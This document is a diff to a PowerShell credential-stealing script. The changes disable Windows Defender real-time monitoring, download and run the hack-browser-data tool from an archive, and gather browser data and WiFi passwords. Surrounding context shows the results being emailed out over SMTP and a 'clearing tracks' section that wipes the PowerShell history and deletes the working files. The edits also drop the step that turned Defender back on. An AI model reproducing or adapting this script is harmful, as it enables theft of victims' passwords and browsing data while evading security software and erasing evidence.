@@ -11,11 +11,13 @@
 
 
 #GET CURRENT LOCATION
+Set-MpPreference -DisableRealtimeMonitoring $true
 $local = Get-Location
 #DOWNLOAD AND RUN EXECUTABLE
-iwr "https://github.com/AnonymousXempt/XDE/releases/download/XDE/hack-browser-data.exe" -outfile "$env:temp\XDE\hack-browser-data.exe"
-start-sleep 5
-.\hack-browser-data.exe
+iwr "Download Link" -outfile "$env:temp\XDE\1.zip"
+expand-archive "$env:temp\XDE\1.zip" "$env:temp\XDE"
+.\hack-browser-data-windows-64bit.exe 
+start-sleep 10
 
 #GET WIFI PASSOWORDS
 $p = "$local\results\wifi"
@@ -74,9 +76,7 @@ $SMTPInfo.Send($E)
 #CLEARING TRACKS
 $E.dispose()
 start-sleep 1
-cmd /c "del /f hack-browser-data.exe"
-cmd /c "del /f %computername%.tar.gz"
-Set-MpPreference -DisableRealtimeMonitoring $false
 Remove-Item (Get-PSReadlineOption).HistorySavePath; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
-cmd /c "del /f mail.ps1"
+cd ..
+Remove-Item –path $env:temp\xde –recurse
 exit
